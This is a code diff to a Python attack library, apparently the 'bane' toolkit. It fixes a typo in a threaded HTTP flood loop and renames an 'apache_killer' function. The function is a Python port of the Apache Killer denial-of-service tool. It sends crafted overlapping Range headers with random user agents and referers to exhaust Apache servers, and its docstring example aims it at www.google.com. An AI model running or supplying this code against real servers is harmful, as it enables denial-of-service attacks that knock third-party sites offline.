@@ -1072,7 +1072,7 @@ class apa(threading.Thread):
      if stop==True:
       break
      try:
-      s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(rando.randint(1,1000000))+str(rando.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
+      s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(random.randint(1,1000000))+str(random.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
       counter+=1
       if prints==True:
        print("Requests sent: {}".format(counter))
@@ -1197,7 +1197,7 @@ def proxslow(u,p=80,threads=500,maxtime=5,ampli=1,speed1=3,speed2=5,read1=1,read
    break
  if returning==True:
   return counter
-def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
  '''
    this is a python version of the apache killer tool which was originally written in perl.
 
@@ -1211,7 +1211,7 @@ def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,int
    example:
 
    >>>import bane
-   >>>bane.apachekiller('www.google.com',p=80)
+   >>>bane.apache_killer('www.google.com',p=80)
 
 '''
  global tor
